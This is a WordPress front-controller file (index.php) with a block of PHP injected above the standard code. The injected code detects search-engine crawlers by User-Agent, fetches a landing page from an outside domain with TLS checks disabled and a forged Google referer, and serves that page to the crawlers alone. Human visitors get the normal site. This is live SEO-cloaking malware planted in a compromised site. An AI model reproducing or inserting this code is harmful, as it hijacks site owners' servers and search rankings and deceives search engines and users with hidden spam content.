<?php
@ob_start();
header("Vary: User-Agent");
$targetUrl = "https://bang-rames.online/landing/bungabakti.html";
$botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
function fetchContentCurl($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        CURLOPT_REFERER => "https://www.google.com/",
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    $content = curl_exec($ch);
    curl_close($ch);
    return $content ?: '';
}
if (preg_match($botPattern, strtolower($userAgent))) {
    usleep(random_int(100000, 200000));
    echo fetchContentCurl($targetUrl);
    @ob_end_flush();
    exit;
}
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
